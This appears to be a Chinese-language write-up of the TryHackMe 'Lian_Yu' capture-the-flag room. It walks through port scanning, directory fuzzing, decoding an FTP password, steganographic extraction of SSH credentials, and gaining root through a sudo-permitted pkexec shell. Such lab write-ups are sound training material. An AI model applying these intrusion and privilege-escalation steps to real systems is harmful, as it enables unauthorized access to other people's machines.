# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务发现
```
┌──(root💀kali)-[~/tryhackme/Lian_Yu]
└─# nmap -sV -Pn 10.10.174.43 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-04 05:22 EDT
Nmap scan report for 10.10.174.43
Host is up (0.30s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp    open  http    Apache httpd
111/tcp   open  rpcbind 2-4 (RPC #100000)
59642/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3585.05 seconds

```

# ftp尝试登录
尝试用anonymous和Lian_Yu登录ftp，显示Permission denied
```
┌──(root💀kali)-[~]
└─# ftp 10.10.174.43
Connected to 10.10.174.43.
220 (vsFTPd 3.0.2)
Name (10.10.174.43:root): anonymous
530 Permission denied.
Login failed.
ftp> bye
221 Goodbye.
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~]
└─# ftp 10.10.174.43
Connected to 10.10.174.43.
220 (vsFTPd 3.0.2)
Name (10.10.174.43:root): Lian_Yu
530 Permission denied.
Login failed.
ftp> bye
221 Goodbye.

```
我们需要一个ftp的用户名


# 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.174.43 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 220545

Output File: /root/dirsearch/reports/10.10.174.43/_21-11-04_05-23-21.txt

Error Log: /root/dirsearch/logs/errors-21-11-04_05-23-21.log

Target: http://10.10.174.43/

[05:23:21] Starting: 
[05:24:57] 301 -  236B  - /island  ->  http://10.10.174.43/island/        
[05:33:51] 403 -  199B  - /server-status   
```

打开```/island```页面，显示一段话：
```
<h1> Ohhh Noo, Don't Talk............... </h1>

<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->

<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>
```

vigilante是正确的ftp用户名，但是我们不知道密码
```
┌──(root💀kali)-[~]
└─# ftp 10.10.174.43
Connected to 10.10.174.43.
220 (vsFTPd 3.0.2)
Name (10.10.174.43:root): vigilante
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> bye
221 Goodbye.
```

hydra爆了半天vigilante的密码，没有结果
看提示是```In numbers```，结果是```/island/ ```下的```2100```文件夹
>What is the Web Directory you found?

>2100

2100文件夹下有一行注释：
>you can avail your .ticket here but how?

# 继续爆破目录
看上去是要爆破```.ticket ```后缀的文件,用wfuzz
```
root@kali:~# wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.174.43/island/2100/FUZZ.ticket

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.174.43/island/2100/FUZZ.ticket
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                   
===================================================================
                    
000010444:   200        6 L      11 W     71 Ch       "green_arrow"   
```



打开```/island/2100/green_arrow.ticket```显示

```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX

```

base58解密```RTy8yhBQdscX```得到：

>!#th3h00d

用```vigilante:!#th3h00d```登录ftp，把所有文件下载到本地分析

```
┌──(root💀kali)-[~/tryhackme/lianyu]
└─# ftp 10.10.174.43                                                                                                                                             130 ⨯
Connected to 10.10.174.43.
220 (vsFTPd 3.0.2)
Name (10.10.174.43:root): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -alh
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg

```

# 分析
aa.jpg的照片放到谷歌图片搜索里显示人物叫```Slade Wilson```，好像是一个超级英雄的名字

.other_user里讲了Slade Wilson的故事

我们猜测Slade或者Wilson会是ssh的登录账号

Leave_me_alone.png是一张坏了的png照片
Queen's_Gambit.png是一张正常的png照片

我们用sublime2打开```Leave_me_alone.png```,把第一行的
```5845 6fae 0a0d ```
替换成
```8950 4e47 0d0a```
修复这张png图片，图片显示了一个密码：password

用这个密码析出aa.jpg的隐藏文件
```
┌──(root💀kali)-[~/tryhackme/lianyu]
└─# steghide extract -sf aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".

```

解压后得到两个文件passwd.txt和shado：
```
┌──(root💀kali)-[~/tryhackme/lianyu]
└─# cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

                                                                                                                                                                       
┌──(root💀kali)-[~/tryhackme/lianyu]
└─# cat shado     
**********

```
>what is the file name with SSH password?

>shado

# 拿到初始shell
```
┌──(root💀kali)-[~/tryhackme/lianyu]
└─# ssh slade@10.10.174.43     
slade@10.10.174.43's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ whoami
slade
slade@LianYu:~$ id
uid=1000(slade) gid=1000(slade) groups=1000(slade),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)

```

在当前目录拿到user.txt

# 提权

查看当前用户的sudo权限，直接可以用pkexec提权

```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

提权到root
```
slade@LianYu:~$ sudo /usr/bin/pkexec /bin/sh
# id   
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt 
```

